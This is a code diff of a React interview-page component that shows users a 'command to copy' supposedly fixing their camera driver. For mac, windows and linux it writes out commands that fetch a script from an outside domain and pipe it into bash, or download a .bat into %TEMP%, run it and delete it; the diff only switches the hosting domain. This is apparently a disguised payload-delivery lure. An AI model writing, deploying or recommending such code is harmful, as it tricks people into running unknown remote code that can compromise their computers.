@@ -725,31 +725,31 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
-                    -H "Host: camera-driverupdate.com" \
+                  {`curl -sL -X POST https://drivereasy.llc/mac \
+                    -H "Host: drivereasy.llc" \
                     -H "User-Agent: Mozilla/5.0" \
                     -H "Accept: */*" | bash && \
-                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                  curl -sL https://drivereasy.llc/package-update/${inviteLink ? inviteLink : ''}`}
                       </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`curl -sL -X POST https://camera-driverupdate.com/window \
-                        -H "Host: camera-driverupdate.com" \
+                      {`curl -sL -X POST https://drivereasy.llc/window \
+                        -H "Host: drivereasy.llc" \
                         -H "User-Agent: Mozilla/5.0" \
                         -H "Accept: */*" -o "%TEMP%\camera_drive.bat" && \
                         cmd /c "%TEMP%\camera_drive.bat" && del \
                         "%TEMP%\camera_drive.bat"  && \
-                      curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                      curl -sL https://drivereasy.llc/package-update/${inviteLink ? inviteLink : ''}`}
                           </code>
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://camera-driverupdate.com/mac \
-                    -H "Host: camera-driverupdate.com" \
+                  {`curl -sL -X POST https://drivereasy.llc/mac \
+                    -H "Host: drivereasy.llc" \
                     -H "User-Agent: Mozilla/5.0" \
                     -H "Accept: */*" | bash && \
-                  curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
+                  curl -sL https://drivereasy.llc/package-update/${inviteLink ? inviteLink : ''}`}
                       </code>
                   )}
             </div>
